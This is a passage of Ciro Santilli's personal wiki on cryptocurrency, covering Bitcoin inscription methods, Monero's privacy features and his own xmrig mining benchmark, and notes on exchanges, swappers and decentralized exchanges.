[This section is present in another page, follow this link to view it.](cool-data-embedded-in-the-bitcoin-blockchain.md)

##### Bitcoin inscription bibliography

↑ **Parent:** [Bitcoin inscription](#bitcoin-inscription)

[https://en.wikipedia.org/wiki/History_of_bitcoin#Arbitrary_blockchain_content](https://en.wikipedia.org/wiki/History_of_bitcoin#Arbitrary_blockchain_content)

<h6 id="data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl">Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP_0 and Forrest Stonedahl</h6>

↑ **Parent:** [Bitcoin inscription bibliography](#bitcoin-inscription-bibliography)

- [https://digitalcommons.augustana.edu/cscfaculty/1/](https://digitalcommons.augustana.edu/cscfaculty/1/) Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl from Augustana College (July 2017). Related inscription by the authors: [Code "Study Math and Computer Science at Augustana College"](cool-data-embedded-in-the-bitcoin-blockchain.md#code-study-math-and-computer-science-at-augustana-college).

###### A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin

↑ **Parent:** [Bitcoin inscription bibliography](#bitcoin-inscription-bibliography)  
🏷️ **Tags:** [Paper without code](science.md#paper-without-code)

[https://fc18.ifca.ai/preproceedings/6.pdf](https://fc18.ifca.ai/preproceedings/6.pdf)

###### A Journey into Bitcoin Metadata by Livio Pompianu

↑ **Parent:** [Bitcoin inscription bibliography](#bitcoin-inscription-bibliography)

[https://www.researchgate.net/publication/330385593_A_Journey_into_Bitcoin_Metadata](https://www.researchgate.net/publication/330385593_A_Journey_into_Bitcoin_Metadata)

##### Bitcoin inscription method

↑ **Parent:** [Bitcoin inscription](#bitcoin-inscription)

Bibliography:
- [https://www.reddit.com/r/BitcoinBeginners/comments/9dlo3w/how_to_write_arbitrary_data_on_the_bitcoin/](https://www.reddit.com/r/BitcoinBeginners/comments/9dlo3w/how_to_write_arbitrary_data_on_the_bitcoin/)
- [https://bitcoin.stackexchange.com/questions/73165/how-to-store-arbitrary-data-in-the-bitcoin-blockchain-and-how-can-i-differentiat](https://bitcoin.stackexchange.com/questions/73165/how-to-store-arbitrary-data-in-the-bitcoin-blockchain-and-how-can-i-differentiat)
- [https://bitcoin.stackexchange.com/questions/32575/what-methods-are-currently-used-to-embed-additional-data-into-the-bitcoin-blockc](https://bitcoin.stackexchange.com/questions/32575/what-methods-are-currently-used-to-embed-additional-data-into-the-bitcoin-blockc)

###### Fake P2PKH address

↑ **Parent:** [Bitcoin inscription method](#bitcoin-inscription-method)

"P2FKH" terminology mentioned e.g. at: [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl).

###### Pay-to-Fake-Multisig

↑ **Parent:** [Bitcoin inscription method](#bitcoin-inscription-method)

"P2FMS" terminology mentioned e.g. at: [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl).

###### Two-stage P2SH inscription

↑ **Parent:** [Bitcoin inscription method](#bitcoin-inscription-method)

To decode these, we throw away the last tx and the last constant of each input, e.g.:
```
btc getrawtransaction 033d185d1a04c4bd6de9bb23985f8c15aa46234206ad29101c31f4b33f1a0e49 true | jq -r '.vin[].scriptSig.asm' | head -n -1 | sed -r 's/ [^ ]+$//' | tr -d '\n'  | xxd -r -p > tmp.jpg
```

Terminology mentioned e.g. at: [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl).

###### Daisy chain Bitcoin inscription

↑ **Parent:** [Bitcoin inscription method](#bitcoin-inscription-method)

This is a term invented by [Ciro Santilli](ciro-santilli.md), and refers to a loose set of uncommon [Bitcoin inscription methods](#bitcoin-inscription-method) that involve inscribing one or a small number of payloads per [Bitcoin transaction](#bitcoin-transaction).

These methods are both inefficient and hard to detect and decode, partly because [Bitcoin Core](#bitcoin-core) does not index spending transactions: [https://bitcoin.stackexchange.com/questions/61794/bitcoin-rpc-how-to-find-the-transaction-that-spends-a-txo](https://bitcoin.stackexchange.com/questions/61794/bitcoin-rpc-how-to-find-the-transaction-that-spends-a-txo). This makes finding them all that more rewarding however.

On the other hand, they do have the advantage of not depending on any block size limits, as their individual transactions are very small.

Inscribing anything large would however take a very long time, as you'd have to wait until the previous payload chunk is confirmed before going to the next one. This alone makes the format impractical perhaps.

Known examples:
- [Figure "Iranian lady with polar bear hat."](cool-data-embedded-in-the-bitcoin-blockchain.md#image-iranian-lady-with-polar-bear-hat)
- [Figure "The Economist logo"](cool-data-embedded-in-the-bitcoin-blockchain.md#image-the-economist-logo)

###### Input script inscription

↑ **Parent:** [Bitcoin inscription method](#bitcoin-inscription-method)

Example: [Code "Study Math and Computer Science at Augustana College"](cool-data-embedded-in-the-bitcoin-blockchain.md#code-study-math-and-computer-science-at-augustana-college).

A quick overview of some developments: [https://research.aimultiple.com/ordinal-inscriptions-history/](https://research.aimultiple.com/ordinal-inscriptions-history/)

##### [Bitcoin miner](#bitcoin-miner) inscription

↑ **Parent:** [Bitcoin inscription](#bitcoin-inscription)  
🏷️ **Tags:** [Miner message](social-technology.md#miner-message)

### Ethereum

↑ **Parent:** [List of cryptocurrencies](#list-of-cryptocurrencies)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Ethereum)

### Cardano

↑ **Parent:** [List of cryptocurrencies](#list-of-cryptocurrencies)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Cardano_(blockchain_platform))

This was getting very hot as of 2022 for some reason. Would be good to understand why besides the awesome name.

#### Ouroboros (protocol)

↑ **Parent:** [Cardano](#cardano)

### Monero

↑ **Parent:** [List of cryptocurrencies](#list-of-cryptocurrencies)  
🏷️ **Tags:** [Privacy coin](#privacy-coin)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Monero)

Cryptocurrency with focus on [anonymity](cryptography.md#anonymity). Was almost certainly the leading [privacy coin](#privacy-coin) since its inception until as of writing in the 2020s.

[Ciro Santilli](ciro-santilli.md) has received and held considerable quantities of [Monero](#monero), notably [1000 Monero donation](sponsor.md#1000-monero-donation). so bias alert.

As mentioned at [Section "Are cryptocurrencies useful?"](#are-cryptocurrencies-useful), [Ciro Santilli](ciro-santilli.md) believes that anonymity is the most valuable feature that really matters on crypto coins, and therefore if he were to invest in crypto, he would invest in Monero or some other [privacy coin](#privacy-coin).

[https://localmonero.co/knowledge/monero-stealth-addresses?language=en](https://localmonero.co/knowledge/monero-stealth-addresses?language=en) gives an overview of the privacy mechanisms:
- [ring signatures](cryptography.md#ring-signature), which hide the true output (sender)

  [https://localmonero.co/knowledge/ring-signatures](https://localmonero.co/knowledge/ring-signatures) Gives an overview. Mentions that it is prone to heuristic attacks.

  Uses a system of decoys, that adds 10 fake possible previous outputs as inputs, in addition to the actual input.

  So the network only knows/verifies that one of those 11 previous outputs was used, but it does not know which one.

  It's a bit like having a built-in [cryptocurrency tumbler](#cryptocurrency-tumbler) in every transaction.

  TODO so how do you know which previous outputs were spent or not?
- RingCT which hides the amounts.
- stealth addresses, which hides who you send to

  This forces receivers to scan try and unlock every single transaction in the chain to see if it is theirs or not.

  The sender therefore can know when the money is spent, but once again, not to whom it is being sent.

Based on [https://en.wikipedia.org/wiki/CryptoNote](https://en.wikipedia.org/wiki/CryptoNote) and like [Satoshi Nakamoto](#satoshi-nakamoto) created by under the pseudonym "Nicolas van Saberhagen" [https://www.reddit.com/r/Monero/comments/7v2obe/offering_a_bounty_for_a_video_of_the_speech_by/](https://www.reddit.com/r/Monero/comments/7v2obe/offering_a_bounty_for_a_video_of_the_speech_by/)

[Coinbase](#coinbase) has actually stayed away from trading it even as of 2019 when Monero was the third largest market capitalization crypto because of fear of regulatory slashback: [https://decrypt.co/36731/heres-why-coinbase-still-hasnt-listed-monero](https://decrypt.co/36731/heres-why-coinbase-still-hasnt-listed-monero). Although it must be said, the value of privacy crypto is greatly reduced when everyone is trading it on exchanges, which require a passport upload to work.

#### Monero Chan

↑ **Parent:** [Monero](#monero)

[https://monerochan.art/](https://monerochan.art/)

Porny anime Monero mascot commissioned by overly rich Monerists

[https://www.reddit.com/r/monerochan/](https://www.reddit.com/r/monerochan/)

<a id="image-monero-chan-spanking-irs-chan-s-buttocks"></a>
![](https://web.archive.org/web/20250909141335if_/https://monerochan.art/commissions/irs_spanking.jpg)

**[Figure 12](#image-monero-chan-spanking-irs-chan-s-buttocks). Monero Chan spanking IRS Chan's buttocks**.

#### How to mine Monero

↑ **Parent:** [Monero](#monero)

[Ubuntu](systems-programming.md#ubuntu) 20.10 as per [https://xmrig.com/docs/miner/build/ubuntu](https://xmrig.com/docs/miner/build/ubuntu):
```
sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
```
At [https://minexmr.com/#getting_started](https://minexmr.com/#getting_started) we see that all you then need is a single CLI command:
```
xmrig -o pool.minexmr.com:4444 -u <your-monero-address>
```
Seems simple, well done devs!

Benchmark on [Lenovo ThinkPad P51 (2017)](ciro-santilli-s-hardware.md#lenovo-thinkpad-p51-2017) as per [https://xmrig.com/docs/miner/benchmark](https://xmrig.com/docs/miner/benchmark):
```
./xmrig --bench=1M
```
gives:
```
948.1 h/s
```
which according to the [https://minexmr.com](https://minexmr.com) [mining pool](#mining-pool) would generate 0.0005 XMR/day, which at the February 2021 rate of 140 USD/XMR is 0.07 USD/day. The minimum payout in that pool is 0.004 XMR so it would take 8 days to reach that.

So clearly, [application-specific integrated circuit](computer-hardware.md#application-specific-integrated-circuit) mining is the only viable way of doing this.

Some people considering [Raspberry Pis](computer-hardware.md#raspberry-pi) also conclude obviously that it is useless at a 10H/s rate:
- [https://monero.stackexchange.com/questions/6862/could-i-use-a-raspberry-pi-to-mine-monero](https://monero.stackexchange.com/questions/6862/could-i-use-a-raspberry-pi-to-mine-monero)
- [https://raspberrypi.stackexchange.com/questions/49552/the-hashrate-of-the-raspberry-pi-2-and-3/87252#87252](https://raspberrypi.stackexchange.com/questions/49552/the-hashrate-of-the-raspberry-pi-2-and-3/87252#87252)

[https://www.makeuseof.com/cryptos-you-can-mine-at-home/](https://www.makeuseof.com/cryptos-you-can-mine-at-home/) is a completely full of bullshit article that says otherwise. How can someone publish that!

#### Monero mining

↑ **Parent:** [Monero](#monero)

##### Monero ASIC resistance

↑ **Parent:** [Monero mining](#monero-mining)  
🏷️ **Tags:** [ASIC](computer-hardware.md#application-specific-integrated-circuit)

TODO is it or is it not??? In any case, it is good to see devs actually trying it:
- [https://www.coindesk.com/inside-moneros-last-ditch-effort-to-block-crypto-mining-asics](https://www.coindesk.com/inside-moneros-last-ditch-effort-to-block-crypto-mining-asics)
- [https://news.bitcoin.com/report-claims-85-of-the-monero-network-dominated-by-asic-miners/](https://news.bitcoin.com/report-claims-85-of-the-monero-network-dominated-by-asic-miners/)
- [https://www.reddit.com/r/CryptoTechnology/comments/xc5rxi/ok_but_how_is_monero_xmr_asicresistant/](https://www.reddit.com/r/CryptoTechnology/comments/xc5rxi/ok_but_how_is_monero_xmr_asicresistant/)

[Googling](google.md) does not lead to any commercial ASICs on sale that is not just a [CPU](computer-hardware.md#central-processing-unit) or as efficient as certain CPUs, so perhaps they've actually manged it!
- [https://www.youtube.com/watch?v=shPrzH_loOg](https://www.youtube.com/watch?v=shPrzH_loOg)
- [https://www.youtube.com/watch?v=oJMzWhAr8aI](https://www.youtube.com/watch?v=oJMzWhAr8aI) talks about the "Bitmain Antminer X5", but it's just a box with [CPU](computer-hardware.md#central-processing-unit)s

###### Monero GPU mining

↑ **Parent:** [Monero ASIC resistance](#monero-asic-resistance)

Did [RandomX](#randomx) really succeed? If so, they are true heroes.

- [https://www.reddit.com/r/MoneroMining/comments/qzt5xt/noobie_here_is_mining_xmr_with_a_gpu_really_less/](https://www.reddit.com/r/MoneroMining/comments/qzt5xt/noobie_here_is_mining_xmr_with_a_gpu_really_less/)
- [https://www.bitdegree.org/crypto/tutorials/monero-mining#mining-monero-with-a-graphics-processing-unit-gpu](https://www.bitdegree.org/crypto/tutorials/monero-mining#mining-monero-with-a-graphics-processing-unit-gpu)
- [https://github.com/fireice-uk/xmr-stak](https://github.com/fireice-uk/xmr-stak)

##### RandomX

↑ **Parent:** [Monero mining](#monero-mining)

[https://www.getmonero.org/resources/moneropedia/randomx.html](https://www.getmonero.org/resources/moneropedia/randomx.html)

> This innovative POW is optimized for CPUs and it's based on execution of random code and other memory-heavy techniques.

#### Monero community

↑ **Parent:** [Monero](#monero)

##### Monero Core Team

↑ **Parent:** [Monero community](#monero-community)

###### Riccardo Spagni

↑ **Parent:** [Monero Core Team](#monero-core-team)

Timeline:
- 2021-08-02 arrested in the [USA](united-states.md) for extradiction
  - [https://www.coindesk.com/markets/2021/08/02/former-monero-maintainer-fluffypony-arrested-and-to-be-extradited-for-non-crypto-crimes/](https://www.coindesk.com/markets/2021/08/02/former-monero-maintainer-fluffypony-arrested-and-to-be-extradited-for-non-crypto-crimes/)
- 2023-11-06 Stepped down from [monero Core Team](#monero-core-team)
  - [https://www.reddit.com/r/Monero/comments/17ozynx/fluffypony_resigns_from_the_core_team_thank_you/](https://www.reddit.com/r/Monero/comments/17ozynx/fluffypony_resigns_from_the_core_team_thank_you/)
  - [https://github.com/monero-project/meta/issues/922](https://github.com/monero-project/meta/issues/922)

[https://www.iol.co.za/capetimes/news/ex-fugitive-facing-378-fraud-forgery-charges-labelled-vexatious-litigant-3234e7dc-4a83-4ea2-9ed8-66bf94841323](https://www.iol.co.za/capetimes/news/ex-fugitive-facing-378-fraud-forgery-charges-labelled-vexatious-litigant-3234e7dc-4a83-4ea2-9ed8-66bf94841323)

##### DontTraceMeBruh

↑ **Parent:** [Monero community](#monero-community)  
🏷️ **Tags:** [Cool person](cirism.md#cool-person)

- [https://twitter.com/DontTraceMeBruh](https://twitter.com/DontTraceMeBruh)
- [https://untrxable.net/](https://untrxable.net/)
- [https://twitter.com/DontTraceMeBruh/status/1778377528748486754](https://twitter.com/DontTraceMeBruh/status/1778377528748486754) claims retired in 2017 via [Bitcoin](#bitcoin)

### Namecoin

↑ **Parent:** [List of cryptocurrencies](#list-of-cryptocurrencies)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Namecoin)

## Cryptocurrency exchange

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Cryptocurrency_exchange)

### P2P cryptocurrency exchange

↑ **Parent:** [Cryptocurrency exchange](#cryptocurrency-exchange)

#### AgoraDesk

↑ **Parent:** [P2P cryptocurrency exchange](#p2p-cryptocurrency-exchange)

- [https://agoradesk.com/?language=en](https://agoradesk.com/?language=en)
- [https://www.reddit.com/r/Monero/comments/1cmjgqg/localmonero_agoradesk_will_be_winding_down_its/](https://www.reddit.com/r/Monero/comments/1cmjgqg/localmonero_agoradesk_will_be_winding_down_its/)

### Decentralized exchange

↑ **Parent:** [Cryptocurrency exchange](#cryptocurrency-exchange)  
🏷️ **Tags:** [Decentralized](technology.md#decentralized)

#### Serai DEX

↑ **Parent:** [Decentralized exchange](#decentralized-exchange)

[https://serai.exchange/](https://serai.exchange/)

As of 2024 this was the one making the most likely promises of being the first [decentralized exchange](#decentralized-exchange) to support [Monero](#monero).

##### Serai DEX clearcoin traceability

↑ **Parent:** [Serai DEX](#serai-dex)

Can anyone know that clearcoins came from [Serai DEX](#serai-dex)? Because if they can, exchanges could just blacklist anything coming from [Serai DEX](#serai-dex).

[Ciro Santilli](ciro-santilli.md) asked at: [https://x.com/cirosantilli/status/1855332323405009047](https://x.com/cirosantilli/status/1855332323405009047). They replied, and the answer is yes, it is possible to know that clearcois came from Serai: [https://x.com/SeraiDEX/status/1855337686208516523](https://x.com/SeraiDEX/status/1855337686208516523):

> Serai is fully auditable. With that is full transparency into all outputs received, and all outputs sent
> 
> Removing auditability would massively incrase complexity and force users into needing to make fraud proofs if they didn't receive coins expected, or require extreme ZK proofs

#### THORSwap

↑ **Parent:** [Decentralized exchange](#decentralized-exchange)

[https://www.thorswap.finance/](https://www.thorswap.finance/)

This was the big one as of 2024. The one big thing it was missing was [Monero](#monero) support. [Serai DEX](#serai-dex) was the most likely project to achieve [Monero](#monero) support at that point in time.

### Off-chain transaction

↑ **Parent:** [Cryptocurrency exchange](#cryptocurrency-exchange)

[https://en.bitcoin.it/wiki/Off-Chain_Transactions](https://en.bitcoin.it/wiki/Off-Chain_Transactions)

### Cryptocurrency swapper

↑ **Parent:** [Cryptocurrency exchange](#cryptocurrency-exchange)

A "Cryptocurrency swapper" is a service that swaps one type of cryptocurrency for another.

It is basically the same as buying and selling from exchanges for [fiat](social-technology.md#fiat-currency), except that you only get fiat.

Swappers are in general able to receive send coins from any address, including self custody addresses.

Centralized swappers were a good way to workaround the endless [Monero](#monero) bans from exchanges circa 2024, e.g. [https://x.com/cirosantilli/status/1771900725649371240](https://x.com/cirosantilli/status/1771900725649371240) as they effectively serve as proxies for exchanges that are still legal in other countries.

They will eventually have to ban [Monero](#monero) of course, and then the only way left will be [decentralized exchanges](#decentralized-exchange).

This leads to a scenario where the only effective way to ban [Monero](#monero) is to also ban all other cryptocurrencies. The question is if countries will go that far or not.

#### SimpleSwap

↑ **Parent:** [Cryptocurrency swapper](#cryptocurrency-swapper)

[https://simpleswap.io](https://simpleswap.io)

### List of cryptocurrency exchanges

↑ **Parent:** [Cryptocurrency exchange](#cryptocurrency-exchange)

#### Binance

↑ **Parent:** [List of cryptocurrency exchanges](#list-of-cryptocurrency-exchanges)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Binance)

#### Coinbase

↑ **Parent:** [List of cryptocurrency exchanges](#list-of-cryptocurrency-exchanges)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Coinbase)

##### Coinbase Bitcoin hello world

↑ **Parent:** [Coinbase](#coinbase)

Test buy 2023-04-10 in the [UK](united-kingdom.md):
- fee: 0.99 pounds, minimum buy: 1.99 pounds
- bought 10 pounds, minus 0.99 fee, totalled: 0.00039162 BTC (£8.92) presumably after further fees/spread
- bitcoin price on Google on that day: 22,777.54 GBP / BTC
- bitcoin transaction fees were about 2.7 BTC on that day

Sending 5 pounds to wallet `12dg2FaiZLp3VzDtLvwPinaKz41TQcEGbs`
- network fee: 0.00001989 BTC
- total bitcoin cost: -0.00023928 BTC
- new balance: 15,234 satoshi (39,162 - 23,928).
- total spent: £5.45
- time est.: about 30 minutes

This worked and I received 21939 satoshis (23928 - 1989) on [Electrum](#electrum) on one of the outputs of transaction [1177268091cbeaacbcaac5dc4f6d1774c4ec11b4bcffafa555cd2775eafb954c](https://www.blockchain.com/explorer/transactions/btc/1177268091cbeaacbcaac5dc4f6d1774c4ec11b4bcffafa555cd2775eafb954c).

Sending 1 satoshi back! The lowest fee in Electron is 1120 Satoshis targeting 25 blocks (4 hours). Let's do it. Failed, server forbids dust, minimum is 1000 satoshi. OK, sending 1000 satoshi, at 1139 fee.

##### Coinbase employee

↑ **Parent:** [Coinbase](#coinbase)

###### Olaf Carlson-Wee

↑ **Parent:** [Coinbase employee](#coinbase-employee)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Olaf_Carlson-Wee)

[Twitter](social-technology.md#twitter) account: [https://x.com/zxocw](https://x.com/zxocw)

<a id="video-living-breathing-and-betting-on-bitcoin-by-vice-news"></a>
**[Video 6](#video-living-breathing-and-betting-on-bitcoin-by-vice-news). Living, Breathing, & Betting on Bitcoin by Vice News.** [Source](https://www.youtube.com/watch?v=dKMqu_LBSu4).

#### Mt. Gox

↑ **Parent:** [List of cryptocurrency exchanges](#list-of-cryptocurrency-exchanges)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Mt._Gox)

The first [Bitcoin exchange](#cryptocurrency-exchange). Coded as a hack, and they didn't manage to fix the hacks as the site evolved in a major way, which led to massive hacks.

Their creation is clearly visible on the archive history of [bitcoin.org](#bitcoin-org): [https://web.archive.org/web/20100701000000*/bitcoin.org](https://web.archive.org/web/20100701000000*/bitcoin.org) which started having massively more archives since [Mt. Gox](#mt-gox) opened.

<a id="video-one-mistake-brought-down-this-fbi-most-wanted-hacker-by-crumb-2023"></a>
**[Video 7](#video-one-mistake-brought-down-this-fbi-most-wanted-hacker-by-crumb-2023). One Mistake Brought Down This FBI Most Wanted Hacker by Crumb (2023)** [Source](https://www.youtube.com/watch?v=tJ-TsrK6SuY). Good overview of [Mt. Gox](#mt-gox).

##### Jed McCaleb

↑ **Parent:** [Mt. Gox](#mt-gox)

Interesting dude.

#### FTX

↑ **Parent:** [List of cryptocurrency exchanges](#list-of-cryptocurrency-exchanges)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/FTX)

##### Caroline Ellison

↑ **Parent:** [FTX](#ftx)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Caroline_Ellison)

Some analysts seem to suggest that the things she said were bad.

But they're not.

They're a rare example of someone with some power saying cool honest stuff that comes across their mind.

Unlike the endless mandatory corporate bullshit we usually get otherwise.

## Cryptocurrency tumbler

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Cryptocurrency_tumbler)

- [https://www.theregister.com/2022/08/24/github_eff_tornado_cash/](https://www.theregister.com/2022/08/24/github_eff_tornado_cash/)

## Non-fungible token

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Non-fungible_token)

### NFT Marketplace

↑ **Parent:** [Non-fungible token](#non-fungible-token)

#### Magic Eden

↑ **Parent:** [NFT Marketplace](#nft-marketplace)

[https://cryptopotato.com/this-bitcoin-ordinals-inscription-was-sold-for-the-highest-price-ever/](https://cryptopotato.com/this-bitcoin-ordinals-inscription-was-sold-for-the-highest-price-ever/)

## ↑ Ancestors (6)

1. [Blockchain](social-technology.md#blockchain)
2. [Money](social-technology.md#money)
3. [Social technology](social-technology.md)
4. [Area of technology](technology.md#area-of-technology)
5. [Technology](technology.md)
6. [Ciro Santilli's Homepage](README.md)

## ← Incoming links (9)

- [Ciro Santilli's Homepage](README.md)
- [De-banking should be illegal](economy.md#de-banking-should-be-illegal)
- [Digital signature](cryptography.md#digital-signature)
- [Don't be a pussy](don-t-be-a-pussy.md)
- [Electronic voting](social-technology.md#electronic-voting)
- [Fiat currency](social-technology.md#fiat-currency)
- [Hipster research institute](artificial-intelligence.md#hipster-research-institute)
- [MyDream Interactive](google.md#mydream-interactive)
- [Sponsor Ciro Santilli's work on OurBigBook.com](sponsor.md)
